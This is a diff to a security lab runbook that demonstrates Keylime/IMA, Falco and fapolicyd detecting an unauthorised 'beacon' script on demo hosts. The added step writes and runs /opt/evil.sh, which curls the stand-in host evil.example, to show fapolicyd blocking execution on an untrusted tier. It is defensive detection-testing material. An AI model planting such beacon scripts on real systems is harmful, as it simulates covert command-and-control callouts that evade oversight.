@@ -183,14 +183,24 @@ ssh root@idm.arbiter.demo journalctl -u keylime_verifier --since "2 minutes ago"
 
 Expected: IMA violation — `/usr/local/bin/beacon.sh` not in allowlist.
 
-**Detection checkpoint — fapolicyd (if binary is executed):**
+**Detection checkpoint — fapolicyd:**
+
+On the verified tier, `/usr/local/bin` is under the trusted `/usr` path, so fapolicyd
+allows execution. The detection here comes from Falco + IMA, not fapolicyd.
+
+To demonstrate fapolicyd blocking, repeat on AGENT-2 (untrusted tier) and drop
+the binary in `/opt/workloads/` (not trusted on untrusted tier):
 
 ```bash
-# Try to execute the dropped binary
-/usr/local/bin/beacon.sh 2>&1
+ssh root@agent-untrusted.arbiter.demo '
+  echo "#!/bin/bash" > /opt/evil.sh
+  echo "curl http://evil.example/beacon" >> /opt/evil.sh
+  chmod +x /opt/evil.sh
+  /opt/evil.sh 2>&1
+'
 ```
 
-Expected: `Operation not permitted` — fapolicyd blocks execution (not in trust path on verified = /usr + /opt/workloads, but /usr/local/bin is under /usr so this succeeds; for untrusted tier, /opt/workloads is excluded and custom paths are blocked).
+Expected on untrusted tier: `Operation not permitted` — fapolicyd blocks (only `/usr` trusted).
 
 **On HUB — check state:**
 
